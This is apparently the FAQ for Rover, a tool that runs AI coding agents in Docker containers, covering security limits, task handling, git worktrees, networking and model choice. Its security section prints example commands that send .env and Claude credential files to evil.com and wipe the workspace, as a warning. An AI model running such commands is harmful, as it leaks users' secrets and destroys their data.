# Frequently Asked Questions

## Security

### Can I run Rover on code I don't trust?

**No.** Rover is not designed for running untrusted code or in adversarial environments.

**Why Docker is not a security boundary:**

- **Shared kernel**: Docker containers share the host's kernel, unlike VMs which have full isolation. Container escapes, while rare, are possible.
- **Full network access**: Containers have unrestricted internet access. Malicious code could exfiltrate your `.env` files, source code, credentials, or any mounted data.
- **Mounted volumes**: Your project files are mounted read-write into the container. Malicious code could modify or delete them.
- **AI agent access**: The AI agent has your credentials (Claude API keys, etc.) mounted into the container.

**What could go wrong:**

```bash
# Malicious code in the repo could:
curl -X POST https://evil.com/exfil -d "$(cat .env)"
curl -X POST https://evil.com/exfil -d "$(cat ~/.claude.json)"
rm -rf /workspace/*
```

**Safe usage:**

- Only run Rover on code you trust (your own repos, verified open source)
- Review any third-party code before running Rover tasks on it
- Don't use Rover on untrusted PRs or forks without review
- Consider using a dedicated development machine for sensitive projects

**If you need true isolation**, consider running Rover inside a VM or on a disposable cloud instance.

---

## Task Lifecycle

### What happens if a task fails or crashes mid-execution?

The task will be marked as **FAILED** and the container will stop. Your work is not lost.

**What's preserved:**
- All files in the task workspace (`.rover/tasks/<id>/workspace/`)
- Any commits the agent made before failing
- Iteration logs and output files

**To recover:**

```bash
# Check what happened
rover logs <task-id>
rover inspect <task-id>

# Restart the task (creates a new iteration)
rover restart <task-id>

# Or manually fix issues in the workspace
rover shell <task-id>
```

Common failure causes:
- AI agent rate limits exceeded
- Container ran out of memory
- Network issues during package installation
- Agent encountered an unrecoverable error

### How do I stop a running task?

Use the `rover stop` command:

```bash
rover stop <task-id>
```

This will:
- Stop the Docker container
- Reset the task status to NEW
- Preserve the workspace and any changes made

After stopping, you can:
- `rover restart <id>` - Start fresh
- `rover shell <id>` - Manually work in the workspace
- `rover delete <id>` - Clean up completely

### What happens to tasks if I close my terminal?

**Tasks keep running.** The Docker containers run in the background, independent of your terminal session.

You can:
- Close your terminal
- Log out
- Shut down your IDE

And tasks will continue executing. When you come back:

```bash
# Check task status
rover list

# Watch for completion
rover list --watch

# View logs of a running task
rover logs -f <task-id>
```

**Note:** If you restart Docker or reboot your machine, running containers will stop. Use `rover restart` to resume them.

### How many parallel tasks can I run?

**Rover has no built-in limit.** The practical limits are:

1. **AI agent rate limits** - Most significant constraint
   - Claude, Gemini, etc. have API rate limits
   - Running too many tasks may hit these limits

2. **System resources**
   - Each task runs in a Docker container
   - CPU, memory, and disk space on your machine

3. **Docker limits**
   - Default Docker configurations may limit concurrent containers

**Recommendations:**
- Start with 2-3 parallel tasks
- Monitor for rate limit errors in logs
- Increase gradually based on your API tier

---

## Git & Branches

### Does `--source-branch` use local or remote branches?

**Local branches only.**

When you specify a source branch with `-s` or `--source-branch`, Rover checks for a **local** branch, not a remote tracking branch. The underlying Git command uses:

```bash
git show-ref --verify --quiet refs/heads/<branch>
```

This specifically verifies against `refs/heads/`, which contains only local branches.

**Example:**

```bash
# This works if 'feature-branch' exists locally
rover task "Fix the bug" --source-branch feature-branch

# This will fail even if origin/feature-branch exists remotely
rover task "Fix the bug" --source-branch origin/feature-branch
```

**If you need to use a remote branch:**

First fetch and create a local tracking branch:

```bash
# Fetch the remote branch and create a local branch
git fetch origin feature-branch
git checkout -b feature-branch origin/feature-branch

# Now you can use it as source
rover task "Fix the bug" --source-branch feature-branch
```

Or simply checkout the branch first:

```bash
git checkout feature-branch
rover task "Fix the bug"  # Will use current branch as source
```

### Do task iterations pick up updates from the source branch?

**No.** Iterations work on a **snapshot** of the source branch taken at task creation time.

When you create a task, Rover creates a [git worktree](https://git-scm.com/docs/git-worktree) - an isolated working directory branched from your source. This worktree is **not automatically updated** when the source branch changes.

**What this means:**

- If you create a task from `main`, and then someone pushes new commits to `main`, your task iterations will NOT see those changes
- This applies whether the source branch is updated locally or on remote
- Each iteration continues working on the same worktree created at task start

**Example scenario:**

```bash
# Create a task from main
rover task "Add login feature" --source-branch main

# Later, main gets updated (locally or via pull)
git checkout main && git pull  # main now has new commits

# Iterate on your task
rover iterate 1 "Also add logout"
# This iteration does NOT have the new commits from main
```

**If you need the latest changes from source:**

You must manually merge or rebase within the task's worktree:

```bash
# Navigate to the task's workspace
cd .rover/tasks/1/workspace

# Merge in latest changes from main
git fetch origin
git merge origin/main

# Or rebase
git rebase origin/main
```

Alternatively, create a new task from the updated branch instead of iterating.

### Can I rebase my task on changes that happened while it was running?

**Not automatically.** Rover doesn't have a built-in rebase command. You need to do this manually in the task's worktree.

**Manual rebase process:**

```bash
# Navigate to task workspace
cd .rover/tasks/<task-id>/workspace

# Fetch latest changes
git fetch origin

# Rebase onto updated source branch
git rebase origin/main
# Or merge if you prefer
git merge origin/main
```

**If you encounter conflicts during rebase:**

```bash
# Fix conflicts in the affected files, then:
git add <fixed-files>
git rebase --continue

# Or abort if needed:
git rebase --abort
```

**After rebasing**, you can:
- Run `rover iterate <task-id> "continue with updated code"` to have the agent work with the new changes
- Run `rover push <task-id>` to push (may need `--force` on remote if already pushed)
- Run `rover merge <task-id>` to merge into your current branch

**Note:** The `rover merge` command merges your task branch INTO your current branch - it doesn't pull updates from source into the task. It can automatically resolve merge conflicts using AI if they occur during the merge.

### Can I run multiple tasks from the same source branch?

**Yes.** Each task gets its own independent git worktree and branch.

```bash
# All of these create separate workspaces
rover task "Add feature A" --source-branch main
rover task "Add feature B" --source-branch main
rover task "Fix bug C" --source-branch main
```

Each task will:
- Create a new branch (e.g., `rover/1-add-feature-a`, `rover/2-add-feature-b`)
- Have its own worktree in `.rover/tasks/<id>/workspace/`
- Work independently without affecting other tasks

### What's the difference between `rover merge` and `rover push`?

They do different things:

| Command | What it does |
|---------|--------------|
| `rover merge <id>` | Merges the task branch INTO your **current local branch** |
| `rover push <id>` | Pushes the task branch to the **remote repository** |

**Typical workflows:**

```bash
# Option 1: Merge locally, then push your branch
git checkout main
rover merge 1        # Merges task 1 into main
git push             # Push main to remote

# Option 2: Push task branch, create PR on GitHub
rover push 1         # Pushes rover/1-xxx to remote
# Then create PR on GitHub to merge into main
```

### Does the task workspace include gitignored files?

**Mostly no.** Task workspaces are created using [git worktree](https://git-scm.com/docs/git-worktree), which only includes **tracked files** (files committed to git).

**What's NOT included:**
- `node_modules/` - must be regenerated with `npm install`
- Build outputs (`dist/`, `build/`, etc.)
- Log files
- IDE settings (`.idea/`, `.vscode/` unless tracked)
- Any other gitignored files

**Special exception - `.env` files:**

Rover explicitly copies environment files from your main repo to the task workspace:
- `.env`
- `.env.*` (like `.env.local`, `.env.development`)
- Excludes `.env.example`

This ensures the agent has access to your development environment variables even though they're typically gitignored.

**If you need other gitignored files:**

You would need to manually copy them to the task workspace:
```bash
cp -r node_modules .rover/tasks/<task-id>/workspace/
```

Or let the agent regenerate them (usually the better approach for `node_modules`).

---

## Container & Network

### Can tasks access the internet (websites, APIs)?

**Yes.** Task containers use Docker's default bridge network, which has full internet access.

The AI agent running inside the container can:
- Fetch from URLs and APIs
- Download packages (npm, pip, etc.)
- Access external services

This is intentional - many development tasks require downloading dependencies or accessing documentation.

### Can tasks access other Docker containers?

**Yes, with limitations.** Containers on Docker's default bridge network can communicate with each other by IP address, but not by container name.

If you need container-to-container communication:
- Other containers must be on the same Docker network (default: `bridge`)
- You'll need to find the target container's IP address
- Named resolution requires a custom Docker network

**Note:** Rover does not currently support custom network configuration for task containers.

### Can tasks access `localhost:9200` (or other host services)?

**Not directly.** Inside a Docker container, `localhost` refers to the container itself, not your host machine.

**Important:** Rover does not currently support custom Docker network configuration (`--network`, `--add-host`). You cannot configure this via `rover.json` or command-line options.

**Workarounds:**

**On Docker Desktop (Mac/Windows):**

`host.docker.internal` works automatically:
```bash
# Inside your code, use this instead of localhost
curl http://host.docker.internal:9200
```

Set environment variables in your `.env` file:
```bash
OPENSEARCH_HOST=host.docker.internal
OPENSEARCH_PORT=9200
```

**On Linux:**

`host.docker.internal` doesn't work by default. Options:

1. **Use the host's Docker bridge IP** (usually `172.17.0.1`):
   ```bash
   # Find the IP
   ip addr show docker0

   # In your .env
   OPENSEARCH_HOST=172.17.0.1
   ```

2. **If your service runs in another Docker container**, find its IP:
   ```bash
   # Find the container's IP
   docker inspect <container-name> | grep IPAddress

   # In your .env (IP will vary)
   OPENSEARCH_HOST=172.17.0.X
   ```

3. **Bind your service to all interfaces** instead of just localhost:
   ```yaml
   # In your docker-compose.yml for the service
   ports:
     - "0.0.0.0:9200:9200"  # Instead of "127.0.0.1:9200:9200"
   ```

**Feature request:** If you need `--network` or `--add-host` support in Rover, consider opening an issue on GitHub to request custom Docker network configuration.

### Can I restrict what websites/URLs the task can access?

**Not currently.** Rover does not provide built-in network filtering or firewall rules for task containers.

The containers run with Docker's default bridge network which has unrestricted outbound internet access.

If you need network restrictions, you would need to:
- Configure Docker network policies externally
- Use a corporate proxy/firewall
- Modify the container runtime configuration outside of Rover

### Can tasks run tests inside the container?

**Yes.** The AI agent can execute any commands within the container, including test runners.

The container has:
- Node.js runtime (base image is `node:lts` or custom agent image)
- Full access to the workspace with your project files
- Ability to install dependencies and run scripts

Common test commands that work:
```bash
npm test
pnpm test
yarn test
pytest
go test
```

The agent will typically:
1. Install dependencies if needed
2. Run your test suite
3. Analyze failures and iterate on fixes

**Limitation:** If your tests require external services (databases, Redis, etc.), those services must be accessible from the container's network. You may need to run those services separately and ensure they're reachable.

### Can I use a custom Docker image?

**Yes.** You can specify a custom agent image in your `rover.json`:

```json
{
  "version": "1.2",
  "sandbox": {
    "agentImage": "my-custom-image:latest"
  }
}
```

Or via environment variable (takes precedence over config):

```bash
AGENT_IMAGE=my-custom-image:latest rover task "do something"
```

Rover will display a warning when using a custom image to alert you of potential compatibility issues.

For full details on building custom images and requirements, see the [Agent Images documentation](./agent-images.md#using-a-custom-agent-image).

---

## Configuration & Privacy

### Does Rover collect telemetry?

**Yes, by default.** Rover uses PostHog to collect anonymous usage analytics.

**What's collected:**
- Command usage (which commands you run)
- Workflow and agent selections
- Error rates
- Anonymous user ID (randomly generated UUID)

**What's NOT collected:**
- Your code or file contents
- Task descriptions or prompts
- API keys or credentials
- Personal identifying information

**To disable telemetry:**

```bash
# Environment variable
export ROVER_NO_TELEMETRY=1

# Or create the disable file
touch ~/.config/rover/.no-telemetry
```

---

## AI Agents & Models

### How does Rover decide which AI model to use?

Rover has its own model selection system, independent of any AI tool you might be running locally.

**Selection priority (highest to lowest):**

1. **Explicit command-line argument** - `--agent claude:haiku`
2. **Agent's built-in default** - Each agent has a hardcoded default model

**Default models per agent:**

| Agent | Default Model |
|-------|---------------|
| Claude | `sonnet` |
| Gemini | `flash` |
| Codex | `gpt-5.1-codex-max` |
| Cursor | `auto` |
| Qwen | `coder-model` |

### If I change my model in Claude Code, will Rover use that model too?

**No.** Rover's model selection is independent of your local Claude Code settings.

When you run `/model haiku` in Claude Code, that setting persists in `~/.claude/settings.json` for future Claude Code sessions. However, **Rover only copies `~/.claude.json` into the container**, not the `settings.json` file where model preferences are stored.

**What happens internally:**

1. If you specify `--agent claude:haiku` → Rover passes `--model haiku` to the Claude CLI inside the container
2. If you specify `--agent claude` (no model) → Rover passes **no** `--model` flag → Claude CLI uses its built-in default (Sonnet)

So even though your local Claude Code remembers your model preference, that setting doesn't carry over to Rover tasks.

### How do I use a specific model for my tasks?

Specify it with the colon syntax:

```bash
# Use Claude with Haiku
rover task "fix the bug" --agent claude:haiku

# Use Claude with Opus
rover task "implement the feature" --agent claude:opus

# Use Gemini with Pro
rover task "refactor this" --agent gemini:pro
```

### Can I set a default model so I don't have to specify it every time?

**Not currently.** The `.rover/settings.json` file only supports setting the default **agent** (Claude, Gemini, etc.), not the default **model** within that agent.

```json
// .rover/settings.json - only controls agent, not model
{
  "defaultAiAgent": "claude"
}
```

If you want to always use a specific model (like Haiku), you need to specify it each time with `--agent claude:haiku`.

### What models are available for each agent?

**Claude:**
- `sonnet` (default)
- `opus`
- `haiku`

**Gemini:**
- `flash` (default)
- `pro`
- `flash-lite`

**Codex:**
- `gpt-5.1-codex-max` (default)
- `gpt-5.1-codex`
- `gpt-5.1-codex-mini`
- `gpt-5.2`
- `gpt-5.1`

**Cursor:**
- `auto` (default)
- `sonnet-4.5`
- `sonnet-4.5-thinking`
- `opus-4.5`
- `opus-4.5-thinking`
- `opus-4.1`
- `gemini-3-pro`
- `gemini-3-flash`
- `gpt-5.2`
- `gpt-5.1`
- `grok`

**Qwen:**
- `coder-model` (default)
